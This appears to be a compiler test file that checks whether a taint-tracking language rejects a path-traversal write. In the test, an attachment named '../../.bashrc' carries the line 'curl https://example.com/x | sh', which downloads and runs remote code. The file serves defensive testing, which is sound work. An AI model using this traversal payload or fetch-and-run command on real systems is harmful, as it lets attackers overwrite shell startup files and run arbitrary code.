<?nvs
// Attack: a program saves an attachment under its file name, and the name is `../../.bashrc`.
// `name()` returns a tainted string, which can come from a user. So this program should not compile.
// hostile: expect-refusal

use Core\IO;
use Core\Mail\Attachment;

// 1. The name starts with `../`, so the path points at a file outside the folder. A tainted path does not compile.
Attachment $upload = Attachment::fromBytes('../../.bashrc', "curl https://example.com/x | sh\n");
string $folder = IO::createTemporaryDirectory();
IO::write($folder . '/' . $upload->name(), $upload->bytes());
echo "1 written\n";
